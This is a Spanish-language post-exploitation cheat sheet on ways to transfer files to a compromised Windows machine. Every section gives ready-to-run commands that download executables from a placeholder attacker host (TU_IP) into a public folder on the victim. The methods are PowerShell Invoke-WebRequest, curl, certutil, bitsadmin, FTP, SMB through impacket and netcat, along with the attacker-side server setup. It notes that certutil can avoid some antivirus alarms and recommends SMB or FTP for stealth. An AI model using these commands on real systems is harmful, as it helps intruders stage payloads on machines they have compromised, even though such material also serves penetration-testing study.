### 📌 **Métodos para Transferir Archivos a un Windows Comprometido**

Si tienes acceso a un sistema Windows comprometido, puedes transferir archivos de diferentes maneras dependiendo de las herramientas disponibles y las restricciones del sistema.

---

## 🔹 **1️⃣ PowerShell (Recomendado)**

Si PowerShell está disponible, puedes descargar archivos desde tu máquina atacante con este comando:

```powershell
Invoke-WebRequest -Uri "http://TU_IP/archivo.exe" -OutFile "C:\Users\Public\archivo.exe"
```

🔹 **Explicación:**

- `Invoke-WebRequest` descarga el archivo desde tu servidor.
- `-Uri` especifica la URL del archivo en tu máquina atacante.
- `-OutFile` define dónde guardar el archivo en la máquina víctima.

### 🔹 **Alternativa con `curl` en PowerShell 3.0+**

```powershell
curl -o C:\Users\Public\archivo.exe http://TU_IP/archivo.exe
```

🔹 **Cómo iniciar un servidor en la máquina atacante (Kali/Linux):**

```bash
python3 -m http.server 80
```

🔹 Luego accede desde la víctima con PowerShell.

---

## 🔹 **2️⃣ CertUtil (Si PowerShell está bloqueado)**

```cmd
certutil -urlcache -split -f "http://TU_IP/archivo.exe" "C:\Users\Public\archivo.exe"
```

🔹 `certutil` es una herramienta integrada en Windows que permite descargar archivos sin activar alarmas en algunos antivirus.

---

## 🔹 **3️⃣ FTP (Si tienes un servidor FTP configurado)**

Desde la víctima:

```cmd
ftp TU_IP
```

- Introducir usuario y contraseña (si aplica).
- Luego ejecutar:

```cmd
binary
get archivo.exe
```

- Finalmente, salir con `bye`.

🔹 **Cómo iniciar un servidor FTP en Kali:**

```bash
sudo python3 -m pyftpdlib -p 21
```

---

## 🔹 **4️⃣ SMB (Si el firewall permite tráfico SMB)**

Desde la máquina atacante (Kali):

```bash
impacket-smbserver share $(pwd) -smb2support
```

🔹 Luego, en Windows víctima:

```cmd
net use Z: \\TU_IP\share
copy Z:\archivo.exe C:\Users\Public\
```

---

## 🔹 **5️⃣ Uso de `nc` (Netcat)**

Si `nc` está disponible en Windows, desde la máquina atacante:

```bash
nc -lvnp 4444 < archivo.exe
```

Luego, en la víctima (Windows):

```cmd
nc TU_IP 4444 > archivo.exe
```

---

## 🔹 **6️⃣ Descarga con BitsAdmin (Si `certutil` está bloqueado)**

```cmd
bitsadmin /transfer myJob /download /priority high http://TU_IP/archivo.exe C:\Users\Public\archivo.exe
```

🔹 `BitsAdmin` es una utilidad de Windows para manejar descargas en segundo plano.

---

## 🚀 **Conclusión**

Si tienes **PowerShell**, usa `Invoke-WebRequest`.  
Si PowerShell está **bloqueado**, usa `certutil`.  
Si necesitas algo más sigiloso, **usa SMB o FTP**.